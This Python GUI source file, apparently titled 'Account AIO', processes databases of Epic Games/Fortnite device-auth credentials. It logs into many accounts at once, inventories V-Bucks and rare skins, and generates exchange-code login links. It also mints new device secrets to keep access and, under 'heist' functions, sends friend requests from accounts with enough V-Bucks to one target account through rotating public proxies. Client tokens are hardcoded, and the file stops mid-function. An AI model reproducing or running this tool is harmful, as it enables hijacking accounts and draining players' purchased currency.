import tkinter as tk
from tkinter import messagebox, ttk
import sv_ttk
import requests
import json
import os
from dateutil import parser
import random
import asyncio
import pyperclip
import threading
from PIL import Image, ImageTk
from io import BytesIO
import httpx
from timeit import default_timer as timer
from colorama import Fore, Style
debug = True

def print_(toprint):
    if debug == True:
        print(toprint)

class AIO(tk.Tk):
    def __init__(self):
        super().__init__()

        self.title(f"Account AIO")
        self.geometry("1300x700")
        sv_ttk.set_theme("dark")

        #vars
        self.loaded_db = None
        self.passed = 0
        self.failed = 0
        self.total = 0
        self.lock = asyncio.Lock()
        self.accs_sorted = []
        self.proxies = [
            "4.175.121.88:80",
            "72.169.67.61:87",
            "147.139.168.187:3128",
            "47.88.3.19:8080",
            "97.76.251.138:8080",
            "47.243.175.55:6969",
            "130.162.128.90:3128",
            "47.243.175.55:8001",
            "35.236.207.242:33333",
            "198.49.68.80:80",
            "66.29.154.105:3128",
            "144.49.99.216:8080",
            "144.49.99.190:8080",
            "38.50.166.244:999",
            "38.45.251.236:999",
            "23.224.132.90:80",
            "138.68.60.8:3128",
            "108.174.194.15:5566",
            "38.45.246.210:999",
            "50.231.0.43:4481",
            "47.243.237.233:80",
            "206.0.16.0:999",
            "34.106.64.101:80",
            "99.20.24.9:8888",
            "193.123.73.47:3128",
            "216.66.89.10:8080",
            "167.235.181.45:2000",
            "172.93.213.177:80",
            "71.86.129.131:8080",
            "138.68.60.8:8080",
            "154.85.58.149:80",
            "161.97.132.227:3128",
            "198.199.86.11:3128",
            "38.156.233.75:999",
            "20.219.137.240:3000",
            "47.243.177.210:8088",
            "159.65.77.168:8585",
            "20.120.240.49:80",
            "185.208.206.182:3128",
            "130.162.161.128:80",
            "159.223.63.181:8118",
            "216.238.99.171:80",
            "170.187.226.142:3128",
            "206.233.177.254:80",
            "23.94.41.236:8081",
            "65.21.232.59:8786",
            "38.52.162.255:999",
            "204.157.240.53:999",
            "129.213.118.148:3128",
            "162.212.157.35:8080",
            "157.245.27.9:3128",
            "162.212.157.238:8080",
            "162.212.153.95:8080",
            "63.42.112.155:8001",
            "34.86.252.79:8585",
            "34.162.24.17:8585",
            "34.86.196.77:8585",
            "34.86.64.245:8585",
            "34.162.183.32:8585",
            "34.162.76.11:8585",
            "35.193.158.6:8585",
            "34.162.59.88:8585",
            "34.162.67.130:8585",
            "34.162.171.228:8585",
            "34.85.211.38:8585",
            "34.86.138.63:8585",
            "34.162.135.2:8585",
            "34.174.141.41:8585",
            "34.162.156.215:8585",
            "34.85.155.119:8585",
            "34.162.53.144:8585",
            "34.162.22.200:8585",
            "35.245.31.182:8585",
            "66.29.154.103:3128",
            "198.44.191.202:45787",
            "38.52.220.198:999",
            "158.101.113.18:80",
            "65.20.171.253:8080",
            "75.89.101.62:80",
            "165.225.206.248:10007",
            "38.51.243.145:999",
            "174.138.184.82:38661"
        ]

        #KEEP AT BOTTOM!!
        self.create_widgets()

    def create_widgets(self):
        self.nav_frame = tk.Frame(self, width=150, bg="#2b2b2b")
        self.nav_frame.pack(side="left", fill="y")

        self.nav_frame.grid_columnconfigure(0, weight=1)
        
        self.main_frame = ttk.Frame(self)
        self.main_frame.pack(pady=20, padx=20, fill="both", expand=True, side="right")

        self.main_load_db_menu = ttk.Button(self.nav_frame, text="Load A DB", command=self.load_db_select)
        self.main_load_db_menu.grid(row=1, column=0, pady=10, sticky="ew")

        self.manage_db_menu = ttk.Button(self.nav_frame, text="Manager", command=self.manage_db_select)
        self.manage_db_menu.grid(row=2, column=0, pady=10, sticky="ew")

        self.check_heist_vbucks_menu = ttk.Button(self.nav_frame, text="Check Heisted Vbucks", command=self.check_heist_vbucks)
        self.check_heist_vbucks_menu.grid(row=3, column=0, pady=10, sticky="ew")

        self.sort_acc_files_menu = ttk.Button(self.nav_frame, text="Sort Account Files", command=self.sort_account_files)
        self.sort_acc_files_menu.grid(row=4, column=0, pady=10, sticky="ew")

        self.get_acc_info_menu = ttk.Button(self.nav_frame, text="Get Account Info", command=self.get_acc_info_select)
        self.get_acc_info_menu.grid(row=4, column=0, pady=10, sticky="ew")

        self.heist_management_menu = ttk.Button(self.nav_frame, text="Heist Management", command=self.heist_manager_select)
        self.heist_management_menu.grid(row=5, column=0, pady=10, sticky="ew")
        
        self.home_button = ttk.Button(self.nav_frame, text="Home", command=self.start_frame)
        self.home_button.grid(row=15, column=0, pady=10, sticky="ew")

        #MAINFRAME
        self.start_frame()
    
    def start_frame(self):
        self.title(f"Account AIO")
        self.clear_frame(self.main_frame)
        self.maintext = ttk.Label(self.main_frame, text="Fortnite AIO", font=("Impact", 150))
        self.maintext.grid(row=2, column=2, columnspan=2, pady=200, padx=125, sticky="ew")

    def clear_frame(self, frame: ttk.Frame):
        for widget in frame.winfo_children():
            widget.destroy()

    def initialize_frame(self):
        self.clear_frame(self.main_frame)
        self.back_button = ttk.Button(self.main_frame, text="◀ Back", command=self.start_frame)
        self.back_button.grid(row=0, column=0, columnspan=2, pady=10, sticky="ew")

    def authenticate_credentials(self, client):
        self.ios_button.destroy()
        self.android_button.destroy()
        if client == "android":
            android = True
            client_token = "M2Y2OWU1NmM3NjQ5NDkyYzhjYzI5ZjFhZjA4YThhMTI6YjUxZWU5Y2IxMjIzNGY1MGE2OWVmYTY3ZWY1MzgxMmU="
        else:
            android = False
            client_token = "MzQ0NmNkNzI2OTRjNGE0NDg1ZDgxYjc3YWRiYjIxNDE6OTIwOWQ0YTVlMjVhNDU3ZmI5YjA3NDg5ZDMxM2I0MWE="
        accounts = json.load(open(f"{self.loaded_db}", encoding="utf8"))["sus"]
        
        self.passed = 0
        self.failed = 0
        self.total = 0
        self.accs_sorted = []
        
        async def authenticate(account_id, device_id, secret, display_name, account, client: httpx.AsyncClient):
            print_(f"[DEBUG {accounts.index(account)+1}/{len(accounts)}] Attempting to auth with {account_id} / {display_name}")
            url = 'https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token'

            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Authorization': f'basic {client_token}'
            }

            data = f"grant_type=device_auth&account_id={account_id}&device_id={device_id}&secret={secret}"

            req = await client.post(url=url, headers=headers, data=data)
            self.total+=1
            if req.status_code != 200:
                print_(f"[Error] Auth failed with {account_id} / {display_name}")
                self.failed+=1
                self.title(f"Account AIO (Managing {self.loaded_db.split("/")[-1]}) | Passed:{self.passed} Failed:{self.failed} Total:{self.total}")
            else:
                print_(f"[Success] Auth successful with {account_id} / {display_name}")
                self.passed+=1
                self.title(f"Account AIO (Managing {self.loaded_db.split("/")[-1]}) | Passed:{self.passed} Failed:{self.failed} Total:{self.total}")
                auth_info = req.json()
                display_name = auth_info["displayName"]
                access_token = auth_info["access_token"]

                url = f"https://account-public-service-prod.ol.epicgames.com/account/api/public/account/{account_id}"

                headers = {
                    'Content-Type':'application/json',
                    'Authorization':f'Bearer {access_token}'
                }

                account_lookup = await client.get(url=url, headers=headers)
                try:
                    last_logged_in = account_lookup.json()["lastLogin"]
                except:
                    last_logged_in = "not available"

                url = f'https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{account_id}/client/QueryProfile?profileId=common_core&rvn=-1'

                headers = {
                    'Content-Type':'application/json',
                    'Authorization':f'Bearer {access_token}'
                }

                composemcp = await client.post(url=url, headers=headers, data="{}")        
                composemcp = composemcp.json()

                try:
                    vbucs = []
                    items = composemcp['profileChanges'][0]['profile']['items']
                    for item in items:
                        if items[item]['templateId'][:12] == "Currency:Mtx":
                            vbucs.append(item)
                    vbuc = list(dict.fromkeys(vbucs))
                    vbucks = 0
                    for abcd in vbuc:
                        vboinkk = composemcp['profileChanges'][0]['profile']['items'][abcd]['quantity']
                        vbucks += vboinkk

                except:
                    vbucks = 0

                url = f'https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{account_id}/client/QueryProfile?profileId=athena&rvn=-1'

                headers = {
                    'Content-Type':'application/json',
                    'Authorization':f'Bearer {access_token}'
                }

                composemcp = await client.post(url=url, headers=headers, data="{}")
                try:
                    last_br_match = composemcp.json()["profileChanges"][0]["profile"]["stats"]["attributes"]["last_match_end_datetime"]
                except:
                    last_br_match = "2027-08-11T03:47:40.318Z"
                try:
                    items = composemcp.json()["profileChanges"][0]["profile"]["items"]
                    skin_count = 0

                    for item in items:
                        if "AthenaCharacter" in items[item]["templateId"]:
                            skin_count+=1
                except:
                    pass
                composemcp = composemcp.text

                special_skins = []
                if "CID_703_Athena_Commando_M_Cyclone".lower() in composemcp:
                    special_skins.append("Travis Scott")
                if "CID_434_Athena_Commando_F_StealthHonor".lower() in composemcp:
                    special_skins.append("Wonder")
                if "CID_342_Athena_Commando_M_StreetRacerMetallic".lower() in composemcp:
                    special_skins.append("Honor Guard")
                if "CID_175_Athena_Commando_M_Celestial".lower() in composemcp:
                    special_skins.append("Galaxy")
                if "CID_313_Athena_Commando_M_KpopFashion".lower() in composemcp:
                    special_skins.append("Ikonik")
                if "CID_028_Athena_Commando_F".lower() in composemcp:
                    special_skins.append("Renegade Raider")
                if "CID_017_Athena_Commando_M".lower() in composemcp:
                    special_skins.append("Aerial Assault Trooper")
                if "CID_516_Athena_Commando_M_BlackWidowRogue".lower() in composemcp:
                    special_skins.append("Rogue Spider Knight")
                if "CID_479_Athena_Commando_F_Davinci".lower() in composemcp:
                    special_skins.append("Glow")
                if "CID_386_Athena_Commando_M_StreetOpsStealth".lower() in composemcp:
                    special_skins.append("Stealth Reflex")
                if "Character_MasterKeyOrder".lower() in composemcp:
                    special_skins.append("Huntmaster Saber")
                if "CID_850_Athena_Commando_F_SkullBriteCube".lower() in composemcp:
                    special_skins.append("Dark Skully")
                if "CID_515_Athena_Commando_M_BarbequeLarry".lower() in composemcp:
                    special_skins.append("Psycho Bandit")
                if "Pickaxe_ID_398_WildCatFemale".lower() in composemcp:
                    special_skins.append("Electri-Claw")
                if "CID_757_Athena_Commando_F_WildCat".lower() in composemcp:
                    special_skins.append("Wildcat")
                if "CID_371_Athena_Commando_M_SpeedyMidnight".lower() in composemcp:
                    special_skins.append("Dark Vertex")
                if "CID_183_Athena_Commando_M_ModernMilitaryRed".lower() in composemcp:
                    special_skins.append("Double Helix")

                try:
                    url = f"https://account-public-service-prod.ol.epicgames.com/account/api/oauth/exchange"
                    headers = {
                        "Authorization":f"Bearer {access_token}"
                    }

                    response = await client.get(url, headers=headers)
                    token = response.json()["code"]
                    url_to_send = f"https://www.epicgames.com/id/exchange?exchangeCode={token}&redirectUrl=https://www.epicgames.com/"
                except:
                    pass

                
                
                async with self.lock:
                    self.accs_sorted.append({"vbucks":vbucks, "account_id":account_id, "device_id":device_id, "secret":secret, "display_name":display_name, "web_link":url_to_send, "special_skins":special_skins, "last_login":last_logged_in, "last_br_match":last_br_match,"skin_count":len(special_skins)})
                        
        async def authenticate_all(accounts):
            start = timer()
            self.lock = asyncio.Lock()
            async with httpx.AsyncClient(limits=httpx.Limits(max_keepalive_connections=20, max_connections=50)) as client:
                tasks = [
                    authenticate(
                        account_id=account["AccountId"],
                        device_id=account["DeviceId"],
                        secret=account["Secret"],
                        display_name=account["DisplayName"],
                        account=account,
                        client=client
                    ) for account in accounts
                ]
                await asyncio.gather(*tasks)
            
            elapsed = timer() - start
            print_(f"Took {elapsed}s to authenticate {len(accounts)} accounts")
        
        asyncio.run(authenticate_all(accounts))
        new_sorted = sorted(self.accs_sorted, key=lambda d: d['skin_count'], reverse=True)
        filename = self.loaded_db.split("/")[-1].split("db.json")[0]
        with open(f"./dbs/checked/checked_{filename}.json", "w") as newdb:
            newdb.write(json.dumps(new_sorted, indent=4))

    def check_credentials(self):
        self.ios_button = ttk.Button(self.main_frame, text="IOS Auths", command=lambda client="ios": self.authenticate_credentials(client))
        self.ios_button.grid(row=3, column=0, pady=10, sticky="ew")
        self.android_button = ttk.Button(self.main_frame, text="Android Auths", command=lambda client="android": self.authenticate_credentials(client))
        self.android_button.grid(row=4, column=0, pady=10, sticky="ew")
    
    def ios_to_android(self, client):
        try:
            accounts = json.load(open(f"{self.loaded_db}", encoding="utf8"))["sus"]
            checked = False
        except:
            accounts = json.load(open(f"{self.loaded_db}", encoding="utf8"))
            checked = True

        if client == "android":
            android = True
            client_token = "M2Y2OWU1NmM3NjQ5NDkyYzhjYzI5ZjFhZjA4YThhMTI6YjUxZWU5Y2IxMjIzNGY1MGE2OWVmYTY3ZWY1MzgxMmU="
        else:
            android = False
            client_token = "MzQ0NmNkNzI2OTRjNGE0NDg1ZDgxYjc3YWRiYjIxNDE6OTIwOWQ0YTVlMjVhNDU3ZmI5YjA3NDg5ZDMxM2I0MWE="
        
        self.passed = 0
        self.failed = 0
        self.total = 0
        self.accs_sorted = []
        
        async def authenticate(account_id, device_id, secret, display_name, account, client: httpx.AsyncClient):
            print_(f"[DEBUG {accounts.index(account)+1}/{len(accounts)}] Attempting to auth with {account_id} / {display_name}")
            url = 'https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token'

            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Authorization': f'basic {client_token}'
            }

            data = f"grant_type=device_auth&account_id={account_id}&device_id={device_id}&secret={secret}"

            req = await client.post(url=url, headers=headers, data=data)
            self.total+=1
            if req.status_code != 200:
                print_(f"[Error] Auth failed with {account_id} / {display_name}")
                self.failed+=1
                self.title(f"Account AIO (Managing {self.loaded_db.split("/")[-1]}) | Passed:{self.passed} Failed:{self.failed} Total:{self.total}")
            else:
                print_(f"[Success] Auth successful with {account_id} / {display_name}")
                self.passed+=1
                self.title(f"Account AIO (Managing {self.loaded_db.split("/")[-1]}) | Passed:{self.passed} Failed:{self.failed} Total:{self.total}")
                auth_info = req.json()
                display_name = auth_info["displayName"]
                access_token = auth_info["access_token"]

                url = f"https://account-public-service-prod.ol.epicgames.com/account/api/public/account/{account_id}"

                headers = {
                    'Content-Type':'application/json',
                    'Authorization':f'Bearer {access_token}'
                }

                account_lookup = await client.get(url=url, headers=headers)
                try:
                    last_logged_in = account_lookup.json()["lastLogin"]
                except:
                    last_logged_in = "not available"

                url = f'https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{account_id}/client/QueryProfile?profileId=common_core&rvn=-1'

                headers = {
                    'Content-Type':'application/json',
                    'Authorization':f'Bearer {access_token}'
                }

                composemcp = await client.post(url=url, headers=headers, data="{}")        
                composemcp = composemcp.json()

                try:
                    vbucs = []
                    items = composemcp['profileChanges'][0]['profile']['items']
                    for item in items:
                        if items[item]['templateId'][:12] == "Currency:Mtx":
                            vbucs.append(item)
                    vbuc = list(dict.fromkeys(vbucs))
                    vbucks = 0
                    for abcd in vbuc:
                        vboinkk = composemcp['profileChanges'][0]['profile']['items'][abcd]['quantity']
                        vbucks += vboinkk

                except:
                    vbucks = 0

                url = f'https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{account_id}/client/QueryProfile?profileId=athena&rvn=-1'

                headers = {
                    'Content-Type':'application/json',
                    'Authorization':f'Bearer {access_token}'
                }

                composemcp = await client.post(url=url, headers=headers, data="{}")
                try:
                    last_br_match = composemcp.json()["profileChanges"][0]["profile"]["stats"]["attributes"]["last_match_end_datetime"]
                except:
                    last_br_match = "2027-08-11T03:47:40.318Z"
                try:
                    items = composemcp.json()["profileChanges"][0]["profile"]["items"]
                    skin_count = 0

                    for item in items:
                        if "AthenaCharacter" in items[item]["templateId"]:
                            skin_count+=1
                except:
                    pass
                composemcp = composemcp.text

                special_skins = []
                if "CID_703_Athena_Commando_M_Cyclone".lower() in composemcp:
                    special_skins.append("Travis Scott")
                if "CID_434_Athena_Commando_F_StealthHonor".lower() in composemcp:
                    special_skins.append("Wonder")
                if "CID_342_Athena_Commando_M_StreetRacerMetallic".lower() in composemcp:
                    special_skins.append("Honor Guard")
                if "CID_175_Athena_Commando_M_Celestial".lower() in composemcp:
                    special_skins.append("Galaxy")
                if "CID_313_Athena_Commando_M_KpopFashion".lower() in composemcp:
                    special_skins.append("Ikonik")
                if "CID_028_Athena_Commando_F".lower() in composemcp:
                    special_skins.append("Renegade Raider")
                if "CID_017_Athena_Commando_M".lower() in composemcp:
                    special_skins.append("Aerial Assault Trooper")
                if "CID_516_Athena_Commando_M_BlackWidowRogue".lower() in composemcp:
                    special_skins.append("Rogue Spider Knight")
                if "CID_479_Athena_Commando_F_Davinci".lower() in composemcp:
                    special_skins.append("Glow")
                if "CID_386_Athena_Commando_M_StreetOpsStealth".lower() in composemcp:
                    special_skins.append("Stealth Reflex")
                if "Character_MasterKeyOrder".lower() in composemcp:
                    special_skins.append("Huntmaster Saber")
                if "CID_850_Athena_Commando_F_SkullBriteCube".lower() in composemcp:
                    special_skins.append("Dark Skully")
                if "CID_515_Athena_Commando_M_BarbequeLarry".lower() in composemcp:
                    special_skins.append("Psycho Bandit")
                if "Pickaxe_ID_398_WildCatFemale".lower() in composemcp:
                    special_skins.append("Electri-Claw")
                if "CID_757_Athena_Commando_F_WildCat".lower() in composemcp:
                    special_skins.append("Wildcat")
                if "CID_371_Athena_Commando_M_SpeedyMidnight".lower() in composemcp:
                    special_skins.append("Dark Vertex")
                if "CID_183_Athena_Commando_M_ModernMilitaryRed".lower() in composemcp:
                    special_skins.append("Double Helix")

                try:
                    url = f"https://account-public-service-prod.ol.epicgames.com/account/api/oauth/exchange"
                    headers = {
                        "Authorization":f"Bearer {access_token}"
                    }

                    response = await client.get(url, headers=headers)
                    token = response.json()["code"]
                    url_to_send = f"https://www.epicgames.com/id/exchange?exchangeCode={token}&redirectUrl=https://www.epicgames.com/"
                except:
                    pass

                #############################IOS TO DROID
                url = 'https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token'

                headers = {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Authorization': 'basic MzQ0NmNkNzI2OTRjNGE0NDg1ZDgxYjc3YWRiYjIxNDE6OTIwOWQ0YTVlMjVhNDU3ZmI5YjA3NDg5ZDMxM2I0MWE='
                }

                data = f"grant_type=device_auth&account_id={account_id}&device_id={device_id}&secret={secret}"

                access_token = await client.post(url=url, headers=headers, data=data)
                
                access_token = access_token.json()
                accessToken = access_token["access_token"]

                url = 'https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/exchange'

                headers = {
                    'Authorization': f'Bearer {accessToken}'
                }

                req = await client.get(url=url, headers=headers)
                
                url = 'https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token'

                headers = {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Authorization': f'basic M2Y2OWU1NmM3NjQ5NDkyYzhjYzI5ZjFhZjA4YThhMTI6YjUxZWU5Y2IxMjIzNGY1MGE2OWVmYTY3ZWY1MzgxMmU='
                }

                body = f"grant_type=exchange_code&exchange_code={req.json()['code']}"

                req = await client.post(url=url, headers=headers, data=body)

                toke = req.json()["access_token"]
                accId = req.json()["account_id"]
                displayname = req.json()["displayName"]

                url = f'https://account-public-service-prod.ol.epicgames.com/account/api/public/account/{accId}/deviceAuth'
                headers = {
                    "Authorization":f'Bearer {toke}',
                    "Content-Type":"application/json"
                }
                data = "{}"

                req = await client.post(url=url, headers=headers, data=data)
                new_device_id = req.json()["deviceId"]
                new_secret = req.json()["secret"]
                #########################################################

                async with self.lock:
                    self.accs_sorted.append({"vbucks":vbucks, "account_id":account_id, "device_id":new_device_id, "secret":new_secret, "display_name":display_name, "web_link":url_to_send, "special_skins":special_skins, "last_login":last_logged_in, "last_br_match":last_br_match,"skin_count":len(special_skins)})
                        
        async def authenticate_all(accounts):
            start = timer()
            self.lock = asyncio.Lock()
            async with httpx.AsyncClient(limits=httpx.Limits(max_keepalive_connections=20, max_connections=50)) as client:
                tasks = [
                    authenticate(
                        account_id=account["AccountId"],
                        device_id=account["DeviceId"],
                        secret=account["Secret"],
                        display_name=account["DisplayName"],
                        account=account,
                        client=client
                    ) for account in accounts
                ]
                await asyncio.gather(*tasks)
            
            elapsed = timer() - start
            print_(f"Took {elapsed}s to authenticate {len(accounts)} accounts")
        
        asyncio.run(authenticate_all(accounts))
        new_sorted = sorted(self.accs_sorted, key=lambda d: d['skin_count'], reverse=True)
        filename = self.loaded_db.split("/")[-1].split("db.json")[0]
        with open(f"./dbs/checked/android_checked_{filename}.json", "w") as newdb:
            newdb.write(json.dumps(new_sorted, indent=4))

    def all_add(self, client):
        self.accs_sorted = []
        acc_id = self.account_id_entry.get()
        min_vbucks = int(self.min_vbucks_entry.get())
        self.addall_button.destroy()
        self.account_id_entry.destroy()
        self.min_vbucks_entry.destroy()
        self.passed = 0
        self.failed = 0
        self.total = 0
        try:
            accounts = json.load(open(f"{self.loaded_db}", encoding="utf8"))["sus"]
            checked = False
        except:
            accounts = json.load(open(f"{self.loaded_db}", encoding="utf8"))
            checked = True

        if client == "android":
            android = True
            client_token = "M2Y2OWU1NmM3NjQ5NDkyYzhjYzI5ZjFhZjA4YThhMTI6YjUxZWU5Y2IxMjIzNGY1MGE2OWVmYTY3ZWY1MzgxMmU="
        else:
            android = False
            client_token = "MzQ0NmNkNzI2OTRjNGE0NDg1ZDgxYjc3YWRiYjIxNDE6OTIwOWQ0YTVlMjVhNDU3ZmI5YjA3NDg5ZDMxM2I0MWE="
        
        self.passed = 0
        self.failed = 0
        self.total = 0
        self.accs_sorted = []
        
        async def authenticate(account_id, device_id, secret, display_name, account, client: httpx.AsyncClient):
            print_(f"[DEBUG {accounts.index(account)+1}/{len(accounts)}] Attempting to auth with {account_id} / {display_name}")
            url = 'https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token'

            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Authorization': f'basic {client_token}'
            }

            data = f"grant_type=device_auth&account_id={account_id}&device_id={device_id}&secret={secret}"

            req = await client.post(url=url, headers=headers, data=data)
            self.total+=1
            if req.status_code != 200:
                print_(f"[Error] Auth failed with {account_id} / {display_name}")
                self.title(f"Account AIO (Managing {self.loaded_db.split("/")[-1]}) | Passed:{self.passed} Failed:{self.failed} Total:{self.total}")
            else:
                print_(f"[Success] Auth successful with {account_id} / {display_name}")
                self.title(f"Account AIO (Managing {self.loaded_db.split("/")[-1]}) | Passed:{self.passed} Failed:{self.failed} Total:{self.total}")
                auth_info = req.json()
                display_name = auth_info["displayName"]
                access_token = auth_info["access_token"]

                url = f'https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{account_id}/client/QueryProfile?profileId=common_core&rvn=-1'

                headers = {
                    'Content-Type':'application/json',
                    'Authorization':f'Bearer {access_token}'
                }

                composemcp = await client.post(url=url, headers=headers, data="{}")        
                composemcp = composemcp.json()

                try:
                    vbucs = []
                    items = composemcp['profileChanges'][0]['profile']['items']
                    for item in items:
                        if items[item]['templateId'][:12] == "Currency:Mtx":
                            vbucs.append(item)
                    vbuc = list(dict.fromkeys(vbucs))
                    vbucks = 0
                    for abcd in vbuc:
                        vboinkk = composemcp['profileChanges'][0]['profile']['items'][abcd]['quantity']
                        vbucks += vboinkk

                except:
                    vbucks = 0
                
                proxy = random.choice(self.proxies)
                proxiess = {
                    "http://": f"http://{proxy}",
                    "https//": f"https://{proxy}"
                }
                
                if os.path.exists(f"./added_{acc_id}.json"):
                    self.accs_sorted = json.load(open(f"./added_{acc_id}.json", encoding="utf8"))
                else:
                    with open(f"./added_{acc_id}.json", "w") as outfile:
                        outfile.write(json.dumps([], indent=4))
                    self.accs_sorted = json.load(open(f"./added_{acc_id}.json", encoding="utf8"))
                
                url = f"https://friends-public-service-prod.ol.epicgames.com/friends/api/v1/{account_id}/friends/{acc_id}"
                if vbucks > min_vbucks:
                    friend_req = requests.post(url, headers={"Authorization":f"Bearer {access_token}", "Content-Type":"application/json"}, proxies=proxiess)
                    request_sent = True
                    self.passed+=1
                    if not friend_req.ok:
                        request_sent = False
                        self.failed+=1
                        print_(f"[Error] Friend request failed with {account_id}")
                    if friend_req.status_code == 409 or "errors.com.epicgames.friends.duplicate_friendship" in friend_req.text:
                        if account_id not in str(self.accs_sorted):
                            request_sent = True
                            self.passed+=1
                        else:
                            False
                else:
                    request_sent = False
                    self.passed+=1
                
                url = f'https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{account_id}/client/QueryProfile?profileId=athena&rvn=-1'

                headers = {
                    'Content-Type':'application/json',
                    'Authorization':f'Bearer {access_token}'
                }

                composemcp = await client.post(url=url, headers=headers, data="{}")
                try:
                    last_br_match = composemcp.json()["profileChanges"][0]["profile"]["stats"]["attributes"]["last_match_end_datetime"]
                except:
                    last_br_match = "2027-08-11T03:47:40.318Z"
                
                if request_sent:
                    self.accs_sorted.append({"vbucks":vbucks, "account_id":account_id, "device_id":device_id, "secret":secret, "display_name":display_name, "last_br_match":last_br_match})
                self.title(f"Account AIO (Managing {self.loaded_db.split("/")[-1]}) | Passed:{self.passed} Failed:{self.failed} Total:{self.total}")

        async def authenticate_all(accounts):
            start = timer()
            self.lock = asyncio.Lock()
            async with httpx.AsyncClient(limits=httpx.Limits(max_keepalive_connections=20, max_connections=50)) as client:
                tasks = [
                    authenticate(
                        account_id=account["AccountId"],
                        device_id=account["DeviceId"],
                        secret=account["Secret"],
                        display_name=account["DisplayName"],
                        account=account,
                        client=client
                    ) for account in accounts
                ]
                await asyncio.gather(*tasks)
            
            elapsed = timer() - start
            print_(f"Took {elapsed}s to authenticate and add {acc_id} on {len(accounts)} accounts")
        
        asyncio.run(authenticate_all(accounts))
        new_sorted = sorted(self.accs_sorted, key=lambda d: d['vbucks'], reverse=True)
        with open(f"./added_{acc_id}.json", "w") as newdb:
            newdb.write(json.dumps(new_sorted, indent=4))
        total_vbucks = 0
        with open(f"./added_{acc_id}.json", "r", encoding="utf8") as infile:
            accs = json.load(infile)
        for acc in accs:
            total_vbucks+=acc["vbucks"]
        total_vbucks = f"{total_vbucks:,}"
        print_(f"[Summary] You will have {total_vbucks} V-Bucks on all accounts")
        input("")

    def check_heist_vbucks(self):
        self.initialize_frame()

        for file in os.listdir("./"):
            if file.endswith(".json") and file.startswith("added_"):
                def count_vbucks(filename):
                    total_vbucks = 0
                    with open(f"./{filename}", "r", encoding="utf8") as infile:
                        accs = json.load(infile)
                    for acc in accs:
                        total_vbucks+=acc["vbucks"]
                    total_vbucks = f"{total_vbucks:,}"
                    messagebox.showinfo(title="Total Vbucks", message=f"{filename.split(".json")[0].split("added_")[-1]} has {total_vbucks} V-Bucks to use.")
                button = ttk.Button(self.main_frame, text=f"{file.split(".json")[0].split("added_")[-1]}", command=lambda db=file: count_vbucks(db))
                button.grid(column=1, padx=10, pady=5, sticky="ew")

    def sort_vbucks(self):
        accounts = json.load(open(f"{self.loaded_db}", encoding="utf8"))
        self.accs_sorted = []
        for account in accounts:
            try:
                last_login = account["last_login"]
                last_match = account["last_br_match"]
                yourdate = parser.parse(last_login)
                timestamp = yourdate.timestamp()
                timestampp = str(timestamp)
                finaltimestamp = timestampp[:-4]
                
                info_new = account
                info_new["last_login_timestamp"] = finaltimestamp

                yourdate = parser.parse(last_match)
                timestamp = yourdate.timestamp()
                timestampp = str(timestamp)
                finaltimestamp = timestampp[:-4]

                info_new["last_br_match_timestamp"] = finaltimestamp
                self.accs_sorted.append(info_new)
            except:
                pass
        new_sorted = sorted(self.accs_sorted, key=lambda d: d['vbucks'], reverse=True)
        with open(f'{self.loaded_db}', "w") as newdb:
            newdb.write(json.dumps(new_sorted, indent=4))

    def sort_skins(self):
        accounts = json.load(open(f"{self.loaded_db}", encoding="utf8"))
        self.accs_sorted = []
        for account in accounts:
            try:
                last_login = account["last_login"]
                last_match = account["last_br_match"]
                yourdate = parser.parse(last_login)
                timestamp = yourdate.timestamp()
                timestampp = str(timestamp)
                finaltimestamp = timestampp[:-4]
                
                info_new = account
                info_new["last_login_timestamp"] = finaltimestamp

                yourdate = parser.parse(last_match)
                timestamp = yourdate.timestamp()
                timestampp = str(timestamp)
                finaltimestamp = timestampp[:-4]

                info_new["last_br_match_timestamp"] = finaltimestamp
                self.accs_sorted.append(info_new)
            except:
                pass
        new_sorted = sorted(self.accs_sorted, key=lambda d: d['skin_count'], reverse=True)
        with open(f'{self.loaded_db}', "w") as newdb:
            newdb.write(json.dumps(new_sorted, indent=4))

    def sort_active(self):
        accounts = json.load(open(f"{self.loaded_db}", encoding="utf8"))
        self.accs_sorted = []
        for account in accounts:
            try:
                last_login = account["last_login"]
                last_match = account["last_br_match"]
                yourdate = parser.parse(last_login)
                timestamp = yourdate.timestamp()
                timestampp = str(timestamp)
                finaltimestamp = timestampp[:-4]
                
                info_new = account
                info_new["last_login_timestamp"] = finaltimestamp

                yourdate = parser.parse(last_match)
                timestamp = yourdate.timestamp()
                timestampp = str(timestamp)
                finaltimestamp = timestampp[:-4]

                info_new["last_br_match_timestamp"] = finaltimestamp
                self.accs_sorted.append(info_new)
            except:
                pass
        new_sorted = sorted(self.accs_sorted, key=lambda d: d['last_br_match_timestamp'], reverse=True)
        with open(f'{self.loaded_db}', "w") as newdb:
            newdb.write(json.dumps(new_sorted, indent=4))

    def show_sort_menu(self):
        self.initialize_frame()
        
        vbucks_button = ttk.Button(self.main_frame, text=f"Sort by Vbucks", command=self.sort_vbucks)
        vbucks_button.grid(row=2, column=1, padx=10, pady=5, sticky="ew")

        skins_button = ttk.Button(self.main_frame, text=f"Sort by Skin Count", command=self.sort_skins)
        skins_button.grid(row=3, column=1, padx=10, pady=5, sticky="ew")

        active_button = ttk.Button(self.main_frame, text=f"Sort by Active Date", command=self.sort_active)
        active_button.grid(row=4, column=1, padx=10, pady=5, sticky="ew")

    def sort_account_files(self):
        self.initialize_frame()

        for file in os.listdir(f"./dbs/checked/"):
            if file.endswith(".json"):
                def load_db__(filename):
                    self.loaded_db = f"./dbs/checked/{filename}"
                    self.show_sort_menu()
